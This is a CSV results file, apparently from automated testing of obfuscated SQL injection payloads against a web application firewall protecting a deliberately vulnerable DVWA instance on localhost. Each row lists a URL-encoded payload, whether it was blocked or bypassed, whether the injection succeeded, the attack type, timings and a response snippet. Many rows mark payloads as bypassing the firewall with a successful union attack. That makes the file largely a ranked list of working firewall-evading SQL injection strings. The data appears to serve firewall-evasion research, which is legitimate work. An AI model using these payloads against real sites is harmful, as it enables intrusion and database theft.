Payload,Status,Exploit Success,Exploit Types,Payload Type,Response Time (s),Memory Usage (MB),Semantic Preserved,Response Code,Snippet
0'<@=1+or+!%0b{a+1}=1=+(not~false),Blocked,No,None,booleanAtk,0.0193,74.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=1.%0b||%0bnot%7e0=+(not%0b{`if`+1}=1),Bypassed,No,None,Unknown,0.0176,74.23,No,500,
0%27or%0b@<@%0b||+{a%0b1}=1+like+{`if`%0b1}=1+or,Bypassed,Yes,Yes (unionAtk),Unknown,0.023,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1+||+not%7e0=%0b(not~0)+||,Blocked,No,None,Unknown,0.0133,74.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+or+!%0b{x%0b(select+1)}=1=+(!%0b,Bypassed,No,None,Unknown,0.0137,74.23,No,500,
0%27<@!=.1%0b||+not+{x%0b(select%0b1)}=1=+(not+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0186,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0bor+not+{x+(select%0b1)}=1=+(!+{`if`,Bypassed,No,None,Unknown,0.0181,74.23,No,500,
0%27<@=.1%0bor+not+1=+(not%7efalse)%0b||,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0272,74.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=1.%0b||+!+{x%0b(select%0b1)}=1=%0b(!+{x,Bypassed,No,None,Unknown,0.0144,74.48,No,500,
0%27<@=.1+or+not+{x%0b(select+1)}=1=+(!+{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0267,74.48,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor+!%7efalse=+(not%0b{x+(select+1)}=1,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0185,74.48,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor%0b{a%0b1}=1+like%0b{x%0b(select+1)}=1--%0b,Bypassed,No,None,piggyAtk,0.0308,74.48,No,500,
0%27<@!=1.%0bor+!+{`if`+1}=1=+(!+{a+1}=1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0244,74.48,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1%0bor+!+{x%0b(select+1)}=1=+(!%0b,Bypassed,Yes,Yes (unionAtk),Unknown,0.0173,74.76,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1+or+!+{x%0b(select+1)}=1=+(!%0b{a,Bypassed,Yes,Yes (unionAtk),Unknown,0.0316,74.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=.1+||+false=%0b(!%0b{x+(select%0b1)}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.0209,74.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+||+!+{`if`%0b1}=1=%0b(not%0b{x+(select,Bypassed,No,None,Unknown,0.0304,74.85,No,500,
0%27<@!=1+or%0b!+{x%0b(select+1)}=1=%0b(not+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0469,73.97,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0b||%0b!%0btrue%0bis%0bfalse+or%27,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0339,73.97,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or+not%7e0=+(!%0btrue)--+,Bypassed,No,None,piggyAtk,0.044,73.97,No,500,
0'<@!=1.%0bor+not+{x%0b(select%0b1)}=1=%0b(!%0b{a,Bypassed,No,None,Unknown,0.0425,73.97,No,500,
0'<@!=1.+||+!%0b{a%0b1}=1=+(not+true),Blocked,No,None,Unknown,0.0312,73.97,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@!=.1+||+!%0b{x+(select+1)}=1=+(not%0b{a,Bypassed,No,None,Unknown,0.0249,73.97,No,500,
0'<@=1%0bor+!+{x%0b(select+1)}=1=%0b(!%0b{x,Bypassed,No,None,Unknown,0.0301,73.97,No,500,
0'<@=1%0b||+{x%0b(select%0b1)}=1+like+{x%0b(select+1)}=1%0b,Bypassed,No,None,Unknown,0.0381,73.97,No,500,
0'<@!=.1+or%0b!+{`if`+1}=1=%0b(not+1),Bypassed,No,None,Unknown,0.0498,73.97,No,500,
0%27<@!=1.+||%0bnot+{x+(select+1)}=1=+(not+{x,Blocked,No,None,Unknown,0.008,73.97,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1+||+!+{a%0b1}=1=+(!%0b{a+,Bypassed,No,None,Unknown,0.0421,73.97,No,500,
0%27<@!=1%0b||%0b!+1=+(not+{a+1}=1),Bypassed,Yes,Yes (unionAtk),Unknown,0.064,74.1,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'||+1<@.+||+!%0b{x%0b(select%0b1)}=1=%0b(!,Bypassed,No,None,Unknown,0.0494,74.23,No,500,
0'<@!=1+or%0b!~0=+(!+{x+(select%0b1)}=1,Blocked,No,None,Unknown,0.0551,74.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0'<@=1.+or+!%0b{x+(select+1)}=1=+(!%0btrue,Bypassed,No,None,booleanAtk,0.0182,74.23,No,500,
0%27<@=1.%0bor+not+{x%0b(select%0b1)}=1=+(not%0b{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0166,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+or%0b!%0b{`if`+1}=1=+(not+{a+1}=1,Bypassed,No,None,Unknown,0.05,74.23,No,500,
0'<@=1%0b||+!+{`if`+1}=1=%0b(!%7efalse),Bypassed,No,None,Unknown,0.0307,74.23,No,500,
0'<@=.1+or%0bnot%0btrue=%0b(!%0b{x+(select+1)}=1,Blocked,No,None,booleanAtk,0.0168,74.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=1.%0bor%0b{x%0b(select+1)}=1+like+{x%0b(select+1)}=1+,Bypassed,Yes,Yes (unionAtk),Unknown,0.027,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@=.1+or%0b!%0b{x%0b(select+1)}=1=+(not%0b{a,Blocked,No,None,Unknown,0.0239,74.23,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
0%27<@=.1%0b||%0bnot%0b{x+(select+1)}=1=+(not%7e,Bypassed,Yes,Yes (unionAtk),Unknown,0.0356,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0b||%0bnot+{a+1}=1=+(not%0b{x+,Bypassed,Yes,Yes (unionAtk),Unknown,0.0292,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0b||%0b!+{x+(select+1)}=1=+(!%0btrue,Bypassed,No,None,Unknown,0.0285,74.23,No,500,
0%27<@=1+or+!%0b{x%0b(select+1)}=1=+(!~0,Bypassed,Yes,Yes (unionAtk),Unknown,0.0225,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1+or+not%0b{x%0b(select%0b1)}=1=%0b(not+,Bypassed,No,None,Unknown,0.0295,74.23,No,500,
0%27<@!=1+||%0b!+{x%0b(select+1)}=1+is%0bfalse%0bor,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0247,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1%0bor+{x+(select%0b1)}=1%0blike%0b{x+(select+1)}=1+,Bypassed,No,None,Unknown,0.0195,74.23,No,500,
0%27<@!=1.%0bor%0b!%0btrue=+(not%0b{x+(select+1)}=1,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0208,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1.%0b||+not+{x+(select+1)}=1=%0b(not~false,Bypassed,Yes,Yes (unionAtk),Unknown,0.0175,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=.1%0bor+!%0b{a+1}=1=+(not+{`if`+,Bypassed,Yes,Yes (unionAtk),Unknown,0.02,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1+or%0b!+{x%0b(select%0b1)}=1=%0b(not%0b1,Bypassed,Yes,Yes (unionAtk),Unknown,0.0189,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1.%0b||%0bnot%0btrue=+(false)--+,Bypassed,Yes,Yes (unionAtk),piggyAtk,0.0179,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor+not%7efalse=+(!%0b{a%0b1}=1),Bypassed,No,None,booleanAtk,0.027,74.23,No,500,
0%27or+1<@.+or+not%0btrue=%0b(!%0b{`if`%0b,Bypassed,Yes,Yes (unionAtk),booleanAtk,0.0201,74.23,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=1.+||+not%0b{x+(select%0b1)}=1=+(not+{x,Bypassed,No,None,Unknown,0.0228,74.23,No,500,
0%27<@!=1+||+!%0b{x%0b(select+1)}=1=+(!%0b{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0347,74.35,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@!=1%0b||+not+{x%0b(select%0b1)}=1=+(not+{x,Bypassed,Yes,Yes (unionAtk),Unknown,0.0124,74.48,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor+not%0b{a+1}=1=%0b(!%0b{x%0b(select,Bypassed,No,None,Unknown,0.0174,74.48,No,500,
0%27||+@<@.+||+not%0b{x+(select%0b1)}=1=%0b(not,Bypassed,Yes,Yes (unionAtk),Unknown,0.0245,74.48,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor%0b!+{a+1}=1=+(not+{x+(select,Bypassed,Yes,Yes (unionAtk),Unknown,0.0145,74.48,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor+!%0b{x+(select+1)}=1=+(not%0b{`if`,Bypassed,Yes,Yes (unionAtk),Unknown,0.0317,74.48,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor%0b{x%0b(select%0b1)}=1+like+{`if`+1}=1+||',Bypassed,No,None,Unknown,0.0292,74.85,No,500,
0'<@=.1+||+!+{a%0b1}=1=+(not%0b{`if`+,Bypassed,No,None,Unknown,0.0262,74.85,No,500,
0'<@=1%0b||%0bnot%0b{`if`%0b1}=1=+(not%0b{`if`%0b1}=1,Bypassed,No,None,Unknown,0.0118,74.85,No,500,
0'<@!=1+||+!%0b{x%0b(select+1)}=1=%0b(false),Bypassed,No,None,Unknown,0.0275,74.85,No,500,
0'<@!=1.+or+!%0btrue=+(!%0b{x+(select%0b,Bypassed,No,None,booleanAtk,0.0236,74.85,No,500,
0%27<@=1.%0bor%0bnot+{x+(select+1)}=1=+(not~0,Bypassed,Yes,Yes (unionAtk),Unknown,0.014,74.85,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor+not%0b{`if`+1}=1=+(not%0b{x%0b(select,Bypassed,No,None,Unknown,0.0133,74.85,No,500,
0'<@!=1.%0bor+!%0b{a%0b1}=1=%0b(not+1),Bypassed,No,None,Unknown,0.0128,74.85,No,500,
0%27<@=.1+||+!%0b{`if`+1}=1=%0b(not+true),Bypassed,Yes,Yes (unionAtk),Unknown,0.0383,73.97,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0%27<@=1%0bor%0b!%0b{x%0b(select+1)}=1=%0b(!+{`if`,Bypassed,Yes,Yes (unionAtk),Unknown,0.0565,73.97,No,200,"<!doctype html>

<html lang=""en-gb"">

	<head>
		<meta http-equiv=""content-type"" content=""text/html; charset=utf-8"" />

		<title>vulnerability: sql injection :: damn vulnerable web application (dvwa)</title>

		<link rel=""stylesheet"" type=""text/css"" href=""../../dvwa/css/main.css"" />

		<link rel=""icon"" type=""\image/ico"" href=""../../favicon.ico"" />

		<script type=""text/javascript"" src=""../../dvwa/js/dvwapage.js""></script>

	</head>

	<body class=""home light"">
		<div id=""container"">

			<div id=""h"
0'<@!=.1%0bor%0bfalse=%0b(not%7efalse)+or%27,Bypassed,No,None,booleanAtk,0.0285,73.97,No,500,
0'<@!=1+||%0b!+{x+(select%0b1)}=1=%0b(!+{x,Blocked,No,None,Unknown,0.024,73.97,No,403,"<!doctype html public ""-//ietf//dtd html 2.0//en"">
<html><head>
<title>403 forbidden</title>
</head><body>
<h1>forbidden</h1>
<p>you don't have permission to access this resource.</p>
<hr>
<address>apache/2.4.58 (ubuntu) server at localhost port 80</address>
</body></html>
"
